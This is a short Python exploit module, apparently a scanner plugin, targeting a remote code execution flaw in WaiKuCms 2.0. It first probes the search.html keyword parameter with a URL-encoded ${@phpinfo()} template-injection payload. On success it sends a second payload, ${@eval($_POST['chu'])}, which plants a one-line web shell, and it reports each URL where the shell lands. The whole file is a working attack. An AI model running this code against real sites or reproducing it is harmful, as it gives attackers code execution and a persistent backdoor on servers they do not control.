import requests


def run(target):
    "WaiKuCms 2.0 Code Exec"
    results = []

    try:
        check = "/index.php/search.html?keyword=%24%7B%40phpinfo%28%29%7D"
        url = "http://" + target + check
        r = requests.get(url, timeout=5)
    except Exception:
        pass
    else:
        r.close()
        if "<title>phpinfo()</title>" in r.text:
            try:
                exp = "/index.php/search.html?keyword=+%24%7B%40eval(%24_POST%5B'chu'%5D)%7D"
                url = "http://" + target + exp
                r = requests.get(url, timeout=5)
            except Exception:
                pass
            else:
                r.close()
                if r.status_code == 200 and "${@eval($_POST['chu'])}" in r.text:
                    results.append(url)

    return results
